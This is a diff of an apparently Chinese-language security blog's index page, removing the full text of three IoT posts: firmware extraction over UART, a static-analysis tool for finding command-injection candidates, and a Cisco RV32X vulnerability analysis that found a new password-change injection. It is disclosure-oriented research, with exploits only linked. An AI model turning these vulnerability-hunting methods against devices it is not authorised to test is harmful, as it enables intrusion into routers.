-<h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><h4 id="焊接并连接-UART-串口"><a href="#焊接并连接-UART-串口" class="headerlink" title="焊接并连接 UART 串口"></a>焊接并连接 UART 串口</h4><p>下图可以看到四个孔处已经被读者用电烙铁焊上了几根针，可以便于我们用杜邦线将板子与<code>FT232</code>相连接。</p>
-<p><img src="/img/%E4%BB%8E%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9C%9F%E6%9C%BA%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6%E5%8C%85%EF%BC%88%E4%B8%80%EF%BC%89/2.png"></p>
-<p>之后，我们用杜邦线把板子和<code>FT232</code>的<code>GND</code>相连，把两者的<code>RXD</code>与<code>TXD</code>反着连。（也就是板子的<code>RXD</code>与<code>FT23的TXD</code>相连，板子的<code>TXD</code>与<code>FT23的RXD</code>相连）注意：在板子通电后最好不要将两者的<code>VCC</code>相连，否则可能损坏设备。</p>
-<h4 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h4><p>在连接好<code>FT232</code>与板子上的串口之后，我选择使用<code>SecureCRT</code>连接进shell。在这里我们可以看出想要进入shell，那么我们必须有登录名和密码。所以通过shell提取固件有一定的局限性。要么该设备不需要账号密码就能登陆，要么知道该设备登陆的账号和密码。</p>
-<p><img src="/img/%E4%BB%8E%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9C%9F%E6%9C%BA%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6%E5%8C%85%EF%BC%88%E4%B8%80%EF%BC%89/3.png"></p>
-<p><img src="/img/%E4%BB%8E%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9C%9F%E6%9C%BA%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6%E5%8C%85%EF%BC%88%E4%B8%80%EF%BC%89/4.png"></p>
-<p>登陆上之后用<code>tftp</code>或者<code>nc</code>等方法即可将固件传出来。</p>
-
+          <p>看IOT也有一段时间了，但是一直都是从官网获取固件包，没有尝试过从真机里提取固件。在看了一些师傅的文章后决定尝试一下从真机中提取固件。正好手里也有几个路由器，于是用刚到手的奖学金去买了提取固件所需要的工具用来学习一下如何通过串口调试获取固件。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/11/06/%E4%BB%8E%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9C%9F%E6%9C%BA%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6%E5%8C%85%EF%BC%88%E4%B8%80%EF%BC%89/">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -460,7 +404,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-12-02 23:36:52" itemprop="dateModified" datetime="2023-12-02T23:36:52+08:00">2023-12-02</time>
+                <time title="Modified: 2024-12-09 21:36:15" itemprop="dateModified" datetime="2024-12-09T21:36:15+08:00">2024-12-09</time>
               </span>
 
           
@@ -474,22 +418,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>接触<strong>iot</strong>也快有一年的时间了，一年来也挖掘了大大小小几十个洞，虽然能有些产出但是却逐渐对人工审计感到无趣和疲惫。在此之间我也尝试过通过使用<strong>污点分析</strong>，<strong>fuzz</strong>等方法去进行自动化漏洞挖掘，但总因为目标不明确而导致挖掘效果不是很好。于是就产生了写一款可以用来辅助跨文件分析危险函数的工具的想法，正好最近在看到 <a target="_blank" rel="noopener" href="https://conference.hitb.org/hitbsecconf2023ams/materials/D1T1%20-%20Your%20Not%20So%20Home%20Office%20-%20Soho%20Hacking%20at%20Pwn2Own%20-%20McCaulay%20Hudson%20&%20Alex%20Plaskett.pdf">https://conference.hitb.org/hitbsecconf2023ams/materials/D1T1%20-%20Your%20Not%20So%20Home%20Office%20-%20Soho%20Hacking%20at%20Pwn2Own%20-%20McCaulay%20Hudson%20&%20Alex%20Plaskett.pdf</a>时，看到了文章中<strong>dcalls</strong>这个工具。他的效果可以很好地满足我之前的想法，但是这款工具貌似并没有开源，于是我就自己尝试去实现了一下这个工具。写完之后感觉效果还行（但是由于时间匆忙，笔者能力有限等原因，此工具也存在很多bug，希望师傅们海涵），又恰好想起了当时自己刚入门<strong>iot</strong>，还不怎么清楚如何进行漏洞挖掘时，不知从何下手却又着急想要出一些成果的场景。于是写下这篇文章，分享给刚入门，并且希望能快速挖掘到漏洞的师傅。</p>
-<h2 id="最常见的逻辑洞"><a href="#最常见的逻辑洞" class="headerlink" title="最常见的逻辑洞"></a>最常见的逻辑洞</h2><p>在我看来，在一些中小型厂商的设备中，最常见的逻辑洞应该是命令注入了。不仅<strong>exp</strong>简单，并且<strong>危害大</strong>，经常可以很容易实现<strong>rce</strong>。想要快速寻找到命令注入漏洞，可以从一些危险函数下手，看看这些危险函数的参数是否可以被我们用户控制。常见的危险函数如<strong>system</strong>，<strong>execve</strong>等。但是很多厂商会在自定义的动态链接库中定义自己的函数，并且在其内部调用这些危险函数。往往这些函数是最有可能被我们忽略掉的，如果在审计时可以注意到这些函数那我们挖掘到漏洞的概率也就会大大提高了。</p>
-<h2 id="如何快速进行漏洞挖掘"><a href="#如何快速进行漏洞挖掘" class="headerlink" title="如何快速进行漏洞挖掘"></a>如何快速进行漏洞挖掘</h2><p><strong>fdcalls</strong>是我编写的一款用来辅助我们寻找危险函数调用以及可能的危险函数的一款工具，已在github上开源（<a target="_blank" rel="noopener" href="https://github.com/fxc233/fdcalls%EF%BC%89%E3%80%82">https://github.com/fxc233/fdcalls）。</a></p>
-<p>接着我们就来看一下如何使用这个工具快速的发现可能的漏洞点，以及可能存在的危险函数。这款工具分为两个模式，第一个模式仅匹配目标文件可能存在命令注入漏洞的地方，并且返回漏洞点及危险函数调用链。如下图，此时我们就可以去显示的地址对是否存在漏洞做进一步的判断。当然由于时间问题，我并没有尝试测过很多不同厂商的设备，这就导致可能会在运行脚本时多出一些错误信息的提示，但是只要脚本不是中断报错，那么就还是可以正常进行分析的。当然显示出来的路径也可能会存在误报的现象。</p>
-<p><img src="/img/fdcalls-%E5%BF%AB%E9%80%9F%E6%8C%96%E6%8E%98%E8%AE%BE%E5%A4%87%E9%80%BB%E8%BE%91%E6%B4%9E%E6%96%B9%E6%B3%95%E5%88%86%E4%BA%AB/1.png"></p>
-<p>第二个模式会显示所有可能的危险函数。加上这个模式的原因是，因为笔者的能力有限，所以一些函数调用处可能处理的不是很好，故有一些危险函数虽然会被会被调用却没能在上面的路径当中显示出来。如下图所示，我们可以看到可能存在的危险函数以及定义他们的动态链接库。我们在模式以扫描出的路径中不能发现漏洞或者扫描不出路径时，可以去二进制文件中搜索这些函数名，如果函数存在那么也有存在漏洞的可能。</p>
-<p><img src="/img/fdcalls-%E5%BF%AB%E9%80%9F%E6%8C%96%E6%8E%98%E8%AE%BE%E5%A4%87%E9%80%BB%E8%BE%91%E6%B4%9E%E6%96%B9%E6%B3%95%E5%88%86%E4%BA%AB/2.png"></p>
-<h2 id="实战应用"><a href="#实战应用" class="headerlink" title="实战应用"></a>实战应用</h2><p>笔者这里就拿在<strong>github</strong>上看到某个的今年新出的<strong>cve</strong>（<a target="_blank" rel="noopener" href="https://github.com/kagehutatsu/IOT_Vulnerability/tree/main/LB-Link/WR450H/CVE-2023-26697">https://github.com/kagehutatsu/IOT_Vulnerability&#x2F;tree&#x2F;main&#x2F;LB-Link&#x2F;WR450H&#x2F;CVE-2023-26697</a>），来看一下这个工具效果。看漏洞提交报告可知，漏洞函数是**.&#x2F;lib&#x2F;libshare-0.0.26.so里的定义的bs_SetForwardingInfo**。</p>
-<p><img src="/img/fdcalls-%E5%BF%AB%E9%80%9F%E6%8C%96%E6%8E%98%E8%AE%BE%E5%A4%87%E9%80%BB%E8%BE%91%E6%B4%9E%E6%96%B9%E6%B3%95%E5%88%86%E4%BA%AB/3.png"></p>
-<p>我们分析的二进制文件是**.&#x2F;bin&#x2F;goahead**，尝试直接用工具扫描试试。</p>
-<p><img src="/img/fdcalls-%E5%BF%AB%E9%80%9F%E6%8C%96%E6%8E%98%E8%AE%BE%E5%A4%87%E9%80%BB%E8%BE%91%E6%B4%9E%E6%96%B9%E6%B3%95%E5%88%86%E4%BA%AB/4.png"></p>
-<p>很可惜我们并没能直接定位到漏洞函数调用的位置，不过好在我们能识别到存在这个危险函数，对我们漏洞挖掘还是能有一定的帮助的。</p>
-<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>祝各位师傅每天都能挖到新的<strong>0day</strong>。最后如果有师傅在使用这个工具是出现了bug，欢迎师傅们在github上提issue。</p>
-<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/fxc233/fdcalls">https://github.com/fxc233/fdcalls</a></p>
-<p>文章首发：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/jZd5BpAmwFZOZuNjc4-oqA">https://mp.weixin.qq.com/s/jZd5BpAmwFZOZuNjc4-oqA</a></p>
-
+          <p>写的一款静态分析工具，可用来帮助查找动态链接库里的危险函数</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/11/06/fdcalls-%E5%BF%AB%E9%80%9F%E6%8C%96%E6%8E%98%E8%AE%BE%E5%A4%87%E9%80%BB%E8%BE%91%E6%B4%9E%E6%96%B9%E6%B3%95%E5%88%86%E4%BA%AB/">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -539,7 +476,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-12-02 23:37:24" itemprop="dateModified" datetime="2023-12-02T23:37:24+08:00">2023-12-02</time>
+                <time title="Modified: 2024-12-09 21:32:54" itemprop="dateModified" datetime="2024-12-09T21:32:54+08:00">2024-12-09</time>
               </span>
 
           
@@ -553,28 +490,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>拿到一个iot设备，笔者比较喜欢先去看一下它的历史漏洞，也许可以从中得到一些启发。发现Cisco之前修补过这个系列设备的命令注入漏洞。</p>
-<p><a target="_blank" rel="noopener" href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-command-inject-BY4c5zd">https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-command-inject-BY4c5zd</a></p>
-<p><img src="/img/Cisco-Rv32X-%E4%BB%8E1day%E5%88%86%E6%9E%90%E5%88%B00day%E6%8C%96%E6%8E%98/1.png"></p>
-<h3 id="1day分析"><a href="#1day分析" class="headerlink" title="1day分析"></a>1day分析</h3><p>因为漏洞通告中有相关固件版本，于是我就去<strong>diff</strong>了一下修补前和修补后两个固件。</p>
-<p><img src="/img/Cisco-Rv32X-%E4%BB%8E1day%E5%88%86%E6%9E%90%E5%88%B00day%E6%8C%96%E6%8E%98/2.png"></p>
-<p>在<strong>ssi.cgi</strong>这个文件当中，笔者发现修复之后的固件比修复前的固件多出了两个函数，那么大概率就是通过这两个函数对存在命令注入的地方加上了检查以修复命令注入漏洞。直接看一下修复之后的固件里的<strong>NK_CHECK_LANGUAGE</strong>函数。很明显，这个函数的作用是对参数进行了判断和设置，和我们预想的一致。那么旧版本固件中存在的命令注入漏洞大概率出现在这个函数的上层函数中。</p>
-<p><img src="/img/Cisco-Rv32X-%E4%BB%8E1day%E5%88%86%E6%9E%90%E5%88%B00day%E6%8C%96%E6%8E%98/3.png"></p>
-<p>通过交叉引用，我们可以很轻松地找到其上层函数是<strong>NK_UiLanguageChange</strong>，我们看一下修补前的固件中的这个函数实现了什么功能。通过函数名，大体可以判断出这个函数的作用应该是切换界面的语言。这个函数首先获取了<strong>submitStatus</strong>和<strong>changelanguage</strong>的值，经过一些判断后，把<strong>changelanguage</strong>的值作为参数传进<strong>CreateFormatFile</strong>函数中。</p>
-<p><img src="/img/Cisco-Rv32X-%E4%BB%8E1day%E5%88%86%E6%9E%90%E5%88%B00day%E6%8C%96%E6%8E%98/4.png"></p>
-<p>我们继续去看一下<strong>CreateFormatFile</strong>函数。很明显，这个函数由于传进来的参数<strong>param_1</strong>没有进过任何检查，存在一个命令注入漏洞。</p>
-<p><img src="/img/Cisco-Rv32X-%E4%BB%8E1day%E5%88%86%E6%9E%90%E5%88%B00day%E6%8C%96%E6%8E%98/5.png"></p>
-<p>这个漏洞的修复方式也很简单，直接用<strong>NK_CHECK_LANGUAGE</strong>函数对参数进行了过滤。</p>
-<h3 id="捕获0day"><a href="#捕获0day" class="headerlink" title="捕获0day"></a>捕获0day</h3><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>知道这个漏洞的前因后果之后，笔者就在想这个被修复之后的固件当中是否依旧可能存在一些没有过滤或者过滤不完整的地方。就去看了一些感觉可能存在漏洞的函数，后来就找到了<strong>NK_UiSetPassword</strong>这个函数，这个函数的作用是更改用户的密码。</p>
-<p><img src="/img/Cisco-Rv32X-%E4%BB%8E1day%E5%88%86%E6%9E%90%E5%88%B00day%E6%8C%96%E6%8E%98/6.png"></p>
-<p>虽然这个函数中对参数进行了一定的过滤，但是这里对于危险字符过滤的并不是很严谨，所以这里也存在一个命令注入漏洞。</p>
-<p><img src="/img/Cisco-Rv32X-%E4%BB%8E1day%E5%88%86%E6%9E%90%E5%88%B00day%E6%8C%96%E6%8E%98/7.png"></p>
-<p>其它地方应该也会存在不少类似的漏洞，但是笔者这里就没有继续去看了，感兴趣的师傅也许可以去找看看。</p>
-<h4 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h4><p><a target="_blank" rel="noopener" href="https://github.com/fxc233/iot-vul/tree/main/Cisco/Cisco%20RV32X">https://github.com/fxc233/iot-vul/tree/main/Cisco/Cisco%20RV32X</a></p>
-<h4 id="Notices"><a href="#Notices" class="headerlink" title="Notices"></a>Notices</h4><p>目前该漏洞已经提交给了思科厂商，思科已确认了该漏洞。<a target="_blank" rel="noopener" href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sb-rv01x_rv32x_rce-nzAGWWDD">https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sb-rv01x_rv32x_rce-nzAGWWDD</a></p>
-<p><img src="/img/Cisco-Rv32X-%E4%BB%8E1day%E5%88%86%E6%9E%90%E5%88%B00day%E6%8C%96%E6%8E%98/8.png"></p>
-<h3 id="文章首发"><a href="#文章首发" class="headerlink" title="文章首发"></a>文章首发</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/UwsQH9nr1D4FzK2lhy_W2A">https://mp.weixin.qq.com/s/UwsQH9nr1D4FzK2lhy_W2A</a></p>
-
+          <p>cisco 家用路由器漏洞复现及漏洞挖掘</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/11/06/Cisco-Rv32X-%E4%BB%8E1day%E5%88%86%E6%9E%90%E5%88%B00day%E6%8C%96%E6%8E%98/">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -692,7 +616,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
